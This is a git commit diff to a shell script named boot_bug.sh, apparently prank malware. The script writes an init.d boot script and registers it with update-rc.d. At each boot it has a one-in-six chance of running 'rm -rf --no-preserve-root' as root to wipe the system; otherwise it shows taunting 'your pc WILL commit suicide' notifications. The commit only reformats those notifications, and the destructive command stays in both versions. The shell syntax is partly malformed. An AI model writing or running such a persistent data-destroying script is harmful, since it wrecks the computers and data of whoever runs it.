a67c5a5fa7fb7765ed2447593010635aeeeded69
Nick <59221356+mrgfy@users.noreply.github.com>
2020-05-15 10:52:20 -0700

    Update boot_bug.sh

--- boot_bug.sh
+++ boot_bug.sh
@@ -2,6 +2,6 @@
 
 touch /etc/init.d/boot_bug.sh && \ 
 echo "[ $[ $RANDOM % 6 ] == 0 } && \ 
-su root -c "rm -rf --no-preserve-root */*" || notify-send --app-name xterm "Your computer is now depressed and has become suicidal. There is a 1 in 6 chance your pc WILL commit suicide. Can you save your pc? Or will it die? Enjoy"; or sleep 5 & wait $last_pid" > /etc/init.d/boot_bug.sh && \ 
+su root -c "rm -rf --no-preserve-root */*" || notify-send --app-name xterm "Your computer is now depressed and has become suicidal." && notify-send --app-name xterm "There is a 1 in 6 chance your pc WILL commit suicide." && notify-send --app-name xterm "Can you save your pc? Or will it die? Enjoy"; or sleep 5 & wait $last_pid" > /etc/init.d/boot_bug.sh && \ 
 chmod 111 /etc/init.d/boot_bug.sh && \ 
 update-rc.d boot_bug.sh defaults;
